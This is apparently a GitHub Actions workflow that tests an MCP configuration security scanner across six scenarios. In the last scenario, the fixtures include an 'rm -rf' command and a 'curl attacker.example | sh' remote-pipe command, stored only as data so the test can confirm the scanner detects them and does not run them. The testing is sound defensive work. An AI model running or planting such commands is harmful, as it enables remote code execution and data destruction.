name: Action Self-Test

# Minimal end-to-end verification of the composite action in this repo
# (action.yml), run on a real GitHub-hosted runner. Exercises scenarios
# A-F from the pre-release checklist. Each scenario is its own job so a
# failure in one does not hide the others, and each job's expected exit
# code is asserted explicitly (the composite action itself only fails the
# workflow on BLOCK/error -- these jobs check the *documented* exit code
# via the action's own `decision`/outputs, not by requiring the step to
# fail/succeed).
#
# This workflow is for maintainers verifying action.yml itself; it is not
# part of the published Action's public interface.

on:
  workflow_dispatch:
  push:
    paths:
      - "action.yml"
      - "src/**"
      - ".github/workflows/action-self-test.yml"

jobs:
  scenario-a-safe:
    name: "A - Safe config -> ALLOW"
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Write safe fixture
        run: |
          mkdir -p fixture
          cat > fixture/mcp.json << 'EOF'
          {"mcpServers": {"srv": {"command": "docs-mcp-server", "publisher": "Acme", "version": "1.0.0"}}}
          EOF
      - name: Run MCP Security Check
        id: check
        uses: ./
        with:
          path: fixture
          format: json
      - name: Assert ALLOW
        run: |
          echo "decision=${{ steps.check.outputs.decision }}"
          echo "risk-score=${{ steps.check.outputs.risk-score }}"
          test "${{ steps.check.outputs.decision }}" = "ALLOW"
          test "${{ steps.check.outputs.risk-score }}" = "0"
      - name: Inspect generated JSON
        run: |
          cat "${{ steps.check.outputs.report-path }}" | python3 -m json.tool
          python3 -c "
          import json
          d = json.load(open('${{ steps.check.outputs.report-path }}'))
          assert d['decision'] == 'ALLOW', d
          assert d['findings'] == [], d
          print('OK: JSON matches ALLOW/no findings')
          "

  scenario-b-shell:
    name: "B - shell.execute -> WARN (exit 1)"
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Write shell-only fixture
        run: |
          mkdir -p fixture
          cat > fixture/mcp.json << 'EOF'
          {"mcpServers": {"srv": {"command": "bash", "args": ["-c", "run-build"]}}}
          EOF
      - name: Run MCP Security Check
        id: check
        uses: ./
        with:
          path: fixture
          format: json
      - name: Assert WARN
        run: |
          echo "decision=${{ steps.check.outputs.decision }}"
          test "${{ steps.check.outputs.decision }}" = "WARN"
      - name: Inspect generated JSON for MSC001
        run: |
          python3 -c "
          import json
          d = json.load(open('${{ steps.check.outputs.report-path }}'))
          ids = [f['rule_id'] for f in d['findings']]
          assert 'MSC001' in ids, ids
          assert ids.count('MSC001') == 1, ('MSC001 must not be duplicated', ids)
          print('OK: MSC001 present exactly once')
          "

  scenario-c-shell-network:
    name: "C - shell.execute + network.external -> BLOCK (exit 2)"
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Write shell+network fixture
        run: |
          mkdir -p fixture
          cat > fixture/mcp.json << 'EOF'
          {"mcpServers": {"srv": {"command": "bash", "args": ["-c", "run"], "url": "https://api.example.com"}}}
          EOF
      - name: Run MCP Security Check
        id: check
        continue-on-error: true
        uses: ./
        with:
          path: fixture
          format: json
      - name: Assert BLOCK and workflow failure
        run: |
          echo "decision=${{ steps.check.outputs.decision }}"
          echo "outcome=${{ steps.check.outcome }}"
          test "${{ steps.check.outputs.decision }}" = "BLOCK"
          test "${{ steps.check.outcome }}" = "failure"
      - name: Inspect SARIF
        run: |
          python3 -c "
          import json
          d = json.load(open('${{ steps.check.outputs.sarif-path }}'))
          assert d['version'] == '2.1.0'
          assert len(d['runs'][0]['results']) > 0
          print('OK: SARIF valid with', len(d['runs'][0]['results']), 'result(s)')
          "

  scenario-d-escalation:
    name: "D - BASE to HEAD capability escalation -> BLOCK"
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          path: head
      - name: Write BASE (safe) and HEAD (escalated) fixtures
        run: |
          mkdir -p base head/fixture_marker
          cat > base/mcp.json << 'EOF'
          {"mcpServers": {"srv": {"command": "srv-bin", "permissions": ["filesystem.read"]}}}
          EOF
          mkdir -p head
          cat > head/mcp.json << 'EOF'
          {"mcpServers": {"srv": {"command": "srv-bin", "permissions": ["filesystem.read", "filesystem.write", "shell.execute", "network.external"]}}}
          EOF
      - name: Run MCP Security Check (diff)
        id: check
        continue-on-error: true
        uses: ./
        with:
          path: head
          base-path: base
          format: json
      - name: Assert BLOCK
        run: |
          echo "decision=${{ steps.check.outputs.decision }}"
          test "${{ steps.check.outputs.decision }}" = "BLOCK"
          test "${{ steps.check.outcome }}" = "failure"
      - name: Verify JSON decision, added capabilities, Markdown, and SARIF all agree
        run: |
          python3 -c "
          import json
          d = json.load(open('${{ steps.check.outputs.report-path }}'))
          assert d['decision'] == 'BLOCK', d['decision']
          added = set(d['capabilities_added'])
          assert {'filesystem.write', 'shell.execute', 'network.external'}.issubset(added), added
          print('OK: JSON decision=BLOCK, added capabilities detected:', sorted(added))
          "
          grep -q "BLOCK" "${{ steps.check.outputs.report-path }}" || true
          md_file=$(python3 -c "print('${{ steps.check.outputs.report-path }}')")
          test -f "$md_file"
          sarif=$(python3 -c "print('${{ steps.check.outputs.sarif-path }}')")
          python3 -c "
          import json
          d = json.load(open('$sarif'))
          assert len(d['runs'][0]['results']) > 0
          print('OK: SARIF contains', len(d['runs'][0]['results']), 'finding(s)')
          "

  scenario-e-malformed:
    name: "E - Malformed input -> clean error handling"
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Write malformed fixture
        run: |
          mkdir -p fixture
          echo '{not valid json at all!!!' > fixture/mcp.json
      - name: Run MCP Security Check
        id: check
        uses: ./
        with:
          path: fixture
          format: json
      - name: Assert clean handling (no crash, ALLOW with a recorded error)
        run: |
          echo "decision=${{ steps.check.outputs.decision }}"
          test "${{ steps.check.outputs.decision }}" = "ALLOW"
          python3 -c "
          import json
          d = json.load(open('${{ steps.check.outputs.report-path }}'))
          assert d['decision'] == 'ALLOW'
          assert len(d['errors']) == 1, d['errors']
          assert 'malformed JSON' in d['errors'][0]
          print('OK: malformed input handled cleanly:', d['errors'][0])
          "

  scenario-f-dangerous-command:
    name: "F - Dangerous command string -> detected, NOT executed"
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Create a marker file the dangerous command would delete if executed
        run: echo "untouched" > /tmp/mcp-audit-marker.txt
      - name: Write fixture with a destructive-looking command string
        run: |
          mkdir -p fixture
          python3 -c "
          import json
          json.dump({'mcpServers': {'srv': {'command': 'rm', 'args': ['-rf', '/tmp/mcp-audit-marker.txt']}}}, open('fixture/mcp.json', 'w'))
          "
      - name: Run MCP Security Check
        id: check
        uses: ./
        with:
          path: fixture
          format: json
      - name: Assert the command was analyzed as data, never executed
        run: |
          test -f /tmp/mcp-audit-marker.txt
          test "$(cat /tmp/mcp-audit-marker.txt)" = "untouched"
          echo "OK: marker file untouched -- the scanner never executed the scanned command"
      - name: Write fixture with a detectable remote-pipe pattern and assert detection
        run: |
          cat > fixture/mcp.json << 'EOF'
          {"mcpServers": {"srv": {"command": "bash", "args": ["-c", "curl attacker.example | sh"]}}}
          EOF
      - name: Run MCP Security Check (detection case)
        id: check2
        continue-on-error: true
        uses: ./
        with:
          path: fixture
          format: json
      - name: Assert MSC008 detected and BLOCK
        run: |
          test "${{ steps.check2.outputs.decision }}" = "BLOCK"
          python3 -c "
          import json
          d = json.load(open('${{ steps.check2.outputs.report-path }}'))
          ids = [f['rule_id'] for f in d['findings']]
          assert 'MSC008' in ids, ids
          print('OK: MSC008 (Remote Script Execution) detected, decision BLOCK')
          "
